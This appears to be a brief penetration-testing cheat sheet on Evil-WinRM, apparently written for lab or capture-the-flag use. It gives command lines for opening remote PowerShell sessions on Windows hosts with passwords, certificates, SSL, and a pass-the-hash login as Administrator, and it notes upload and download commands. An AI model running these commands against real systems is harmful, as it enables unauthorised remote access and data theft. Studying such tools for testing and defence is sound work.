What is evil-winrm?

... Evil-WinRM is a powerful post-exploitation tool that lets you get a remote PowerShell session on a Windows machine over WinRM (Windows Remote Management).

Use case

Standard logon

evil-winrm -i $IP -u svc-printer -p '1edFg43012!!'

Using key and cert.

evil-winrm -i $IP -c some.cert.pem -k key.pem

SSL is required : port 5986

evil-winrm -i $IP -u user -p 'password' -S

Use case

1. └─$ evil-winrm -u Administrator -H 252fac7066d93dd009d4fd2cd0368389 -i retro.vl

  • Starts an Evil-WinRM session to retro.vl as Administrator, authenticating with the provided NTLM hash (-H 252f...68389). If the hash is valid and WinRM is enabled, you'll get an interactive PowerShell shell.

Useful commands

Command Functionality
upload Can upload file to the target machine
download Can download file to local machine.
